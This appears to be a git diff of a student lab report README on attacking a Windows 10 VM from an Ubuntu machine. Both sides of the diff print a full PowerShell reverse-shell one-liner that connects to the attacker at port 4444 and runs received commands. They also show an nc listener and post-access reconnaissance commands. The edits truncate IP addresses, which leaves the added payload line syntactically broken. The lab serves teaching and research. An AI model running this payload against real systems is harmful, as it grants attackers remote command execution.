@@ -102,7 +102,7 @@ Output:
 ```
 ┌─────────────────────┐         NAT Network        ┌─────────────────────┐
 │  Ubuntu Attacker    │      192.168.1.0/24        │  Windows 10 Target  │
-│  IP: 192.168.1.4    │◄─────────────────────────►│  IP: 192.168.1.5    │
+│  IP: 192.    │◄─────────────────────────►│  IP: 192.    │
 │                     │                            │                     │
 │  Tools:             │                            │  Services:          │
 │  • Nmap             │                            │  • SMB (139, 445)   │
@@ -129,13 +129,13 @@ Output:
 nc -lvnp 4444
 
 # Step 2: Wait for connection from Windows
-# Connection received on 192.168.1.5 50027
+# Connection received on 192.
 ```
 
 ### On Windows (Target):
 ```powershell
 # Executed PowerShell reverse shell payload (runs in memory)
-powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.4',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 ### Remote Commands Executed:
@@ -143,7 +143,7 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.4',4
 whoami                    # Verified user: DESKTOP-OJHDIT4\Students
 hostname                  # Confirmed target: DESKTOP-OJHDIT4
 systeminfo                # Full system information collected
-ipconfig                  # Network configuration: 192.168.1.5
+ipconfig                  # Network configuration: 192.
 pwd                       # Current directory: C:\Windows\temp
 Get-Process powershell    # Identified 6 PowerShell processes
 Get-ChildItem C:\Windows\Temp  # Verified no new malicious files
@@ -177,7 +177,7 @@ Get-ChildItem C:\Windows\Temp  # Verified no new malicious files
    - Reproducible methodology for other researchers
 
 
-### Ashley this is for you.
+### Sh This is for you.
 1. Show `system_design_diagram.pdf` - clear network topology
 2. Explain attack flow using `attack_timeline.pdf`
 3. Present experimental results from tables
